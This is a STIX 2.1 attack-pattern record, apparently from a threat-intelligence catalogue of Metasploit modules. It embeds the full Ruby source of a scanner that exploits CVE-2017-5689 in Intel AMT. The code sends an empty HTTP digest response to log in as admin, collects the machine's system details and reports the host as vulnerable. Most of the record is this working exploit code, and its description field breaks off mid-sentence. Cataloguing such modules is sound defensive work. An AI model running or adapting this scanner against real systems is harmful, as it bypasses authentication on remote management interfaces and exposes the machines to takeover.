{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f3fa60c-146f-459b-afc5-d1cf5c78e043",
    "created": "2024-08-14T16:29:21.816446Z",
    "modified": "2024-08-14T16:29:21.816451Z",
    "name": "Intel AMT Digest Authentication Bypass Scanner",
    "description": " This module scans for Intel Active Management Technology endpoints and attempts",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/intel_amt_digest_bypass.rb",
            "external_id": "intel_amt_digest_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5689"
        },
        {
            "source_name": "reference",
            "url": "https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "https://www.intel.com/content/www/us/en/security-center/default.html?intelid=INTEL-SA-00075&languageid=en-fr"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Intel AMT Digest Authentication Bypass Scanner',\n      'Description' => %q{\n        This module scans for Intel Active Management Technology endpoints and attempts\n        to bypass authentication using a blank HTTP digest (CVE-2017-5689). This service\n        can be found on ports 16992, 16993 (tls), 623, and 624 (tls).\n      },\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2017-5689' ],\n          [ 'URL', 'https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability' ],\n          [ 'URL', 'https://www.intel.com/content/www/us/en/security-center/default.html?intelid=INTEL-SA-00075&languageid=en-fr' ],\n        ],\n      'DisclosureDate' => 'May 05 2017'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(16992),\n      ])\n  end\n\n  # Fingerprint a single host\n  def run_host(ip)\n    begin\n      connect\n      res = send_request_raw({ 'uri' => '/hw-sys.htm', 'method' => 'GET' })\n      unless res && res.headers['Server'].to_s.index('Intel(R) Active Management Technology')\n        disconnect\n        return\n      end\n\n      vprint_status(\"#{ip}:#{rport} - Found an Intel AMT endpoint: #{res.headers['Server']}\")\n\n      unless res.headers['WWW-Authenticate'] =~ /realm=\"([^\"]+)\".*nonce=\"([^\"]+)\"/\n        vprint_status(\"#{ip}:#{rport} - AMT service did not send a valid digest response\")\n        disconnect\n        return\n      end\n\n      realm = $1\n      nonce = $2\n      cnonce = Rex::Text.rand_text(10)\n\n      res = send_request_raw(\n        {\n          'uri'     => '/hw-sys.htm',\n          'method'  => 'GET',\n          'headers' => {\n            'Authorization' =>\n              \"Digest username=\\\"admin\\\", realm=\\\"#{realm}\\\", nonce=\\\"#{nonce}\\\", uri=\\\"/hw-sys.htm\\\", \" +\n              \"cnonce=\\\"#{cnonce}\\\", nc=1, qop=\\\"auth\\\", response=\\\"\\\"\"\n          }\n        })\n\n      unless res && res.body.to_s.index(\"Computer model\")\n        vprint_error(\"#{ip}:#{rport} - AMT service does not appear to be vulnerable\")\n        return\n      end\n\n      proof = res.body.to_s\n      proof_hash = nil\n\n      info_keys = res.body.scan(/<td class=r1><p>([^\\<]+)(?:<\\/p>)?/).map{|x| x.first.to_s.gsub(\"&#x2F;\", \"/\") }\n      if info_keys.length > 0\n        proof_hash = {}\n        proof = \"\"\n\n        info_vals = res.body.scan(/<td class=r1>([^\\<]+)</).map{|x| x.first.to_s.gsub(\"&#x2F;\", \"/\") }\n        info_keys.each do |ik|\n          iv = info_vals.shift\n          break unless iv\n          proof_hash[ik] = iv\n          proof << \"#{iv}: #{ik}\\n\"\n        end\n      end\n\n      print_good(\"#{ip}:#{rport} - Vulnerable to CVE-2017-5689 #{proof_hash.inspect}\")\n\n      report_note(\n        :host  => ip,\n        :proto => 'tcp',\n        :port  => rport,\n        :type  => 'intel.amt.system_information',\n        :data  => proof_hash\n      )\n\n      report_vuln({\n        :host  => rhost,\n        :port  => rport,\n        :proto => 'tcp',\n        :name  => \"Intel AMT Digest Authentication Bypass\",\n        :refs  => self.references,\n        :info => proof\n      })\n\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "hdm",
        ""
    ],
    "x_mitre_disclosure_date": "May 05 2017"
}